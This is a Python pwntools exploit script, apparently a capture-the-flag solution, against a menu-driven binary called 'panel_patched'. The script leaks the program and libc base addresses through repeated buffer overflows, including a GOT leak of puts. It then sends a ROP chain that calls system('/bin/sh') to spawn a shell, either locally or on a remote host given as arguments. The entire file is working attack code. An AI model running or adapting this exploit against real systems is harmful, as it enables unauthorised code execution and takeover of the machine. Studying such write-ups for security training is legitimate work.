#!/usr/bin/env python3

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
encode = lambda e: e if type(e) == bytes else str(e).encode()
hexleak = lambda l: int(l[:-1] if l[-1] == '\n' else l, 16)
fixleak = lambda l: unpack(l[:-1].ljust(8, b"\x00"))

exe = "./panel_patched"
elf = context.binary = ELF(exe)
libc = elf.libc
io = remote(sys.argv[1], int(sys.argv[2])) if args.REMOTE else process()
if args.GDB: gdb.attach(io, "")

# One more thing we can do here is:
# Instead of overwrting with 0x0e, we can overwrite with 0x3f70
# The last nibble i.e. 0x3 is subject to change but we'll have
# a max of 0-9 values to bruteforce so we can easily bruteforce
# and get the value. However, just one more step will i.e. 0x0e
# will ensure a shell everytime so; mehhh.

io.sendlineafter(b"> ", b"2")
payload = flat(cyclic(56, n=8)+b"\x0e")
io.sendlineafter(b"> ", b"1")
io.sendafter(b": ", payload)
io.sendlineafter(b"> ", b"3")

io.recv(62)
leak = fixleak(io.recvline())
elf.address = leak - 0x200e
print("elf @ %#x" % elf.address)

payload = flat(cyclic(56, n=8),elf.got.puts)
io.sendlineafter(b"> ", b"1")
io.sendafter(b": ", payload)
io.sendlineafter(b"> ", b"3")
io.recvuntil(b"Role: ")
puts = fixleak(io.recvline())
libc.address = puts - libc.sym.puts

print("libc @ %#x" % libc.address)

POP_RDI = libc.address + 0x000000000002a3e5
RET = libc.address + 0x0000000000029139
payload = flat(
	cyclic(72, n=8),
	POP_RDI,
	next(libc.search(b"/bin/sh")),
	RET,
	libc.sym.system
)
io.sendlineafter(b"> ", b"1")
io.sendlineafter(b": ", payload)


io.interactive()